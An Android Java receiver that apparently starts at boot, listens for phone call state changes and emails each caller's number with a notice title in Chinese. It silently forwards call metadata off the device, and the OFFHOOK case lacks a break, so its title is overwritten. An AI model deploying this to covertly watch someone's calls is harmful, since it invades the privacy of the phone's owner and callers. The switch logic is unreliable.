package com.suno2.suno2email.broad;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.suno2.suno2email.SendEmailTask;
import com.suno2.suno2email.builde.Message;

public class BootBroadcastReceiver extends BroadcastReceiver {


    private SendEmailTask mSendEmailTask;

    @Override
    public void onReceive(Context context, Intent intent) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
        tm.listen(new PhoneListener(context), PhoneStateListener.LISTEN_CALL_STATE);
    }

    private final class PhoneListener extends PhoneStateListener {

        private Context context;

        public PhoneListener(Context context) {
            this.context = context;
        }

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            String title = "位置状态";
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:   //来电
                        title = "电话 来电通知";
                        Log.d("TAG","电话 来电通知 :" +  incomingNumber);
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:   //接通电话
                        title = "电话 接听通知";
                        Log.d("TAG","电话 接听通知 :" +  incomingNumber);
                    case TelephonyManager.CALL_STATE_IDLE:  //挂掉电话
                        title = "电话 挂断通知";
                        Log.d("TAG","电话 挂断通知 :" +  incomingNumber);
                        break;
                }

                Message build = new Message.Builde()
                        .setTitle(title)
                        .setMessage("手机号码 :" + incomingNumber)
                        .setMunber(incomingNumber)
                        .build();
                mSendEmailTask = new SendEmailTask(build);
                mSendEmailTask.execute((Void) null);

            } catch (IllegalStateException e) {
                e.printStackTrace();
            }
        }
    }

}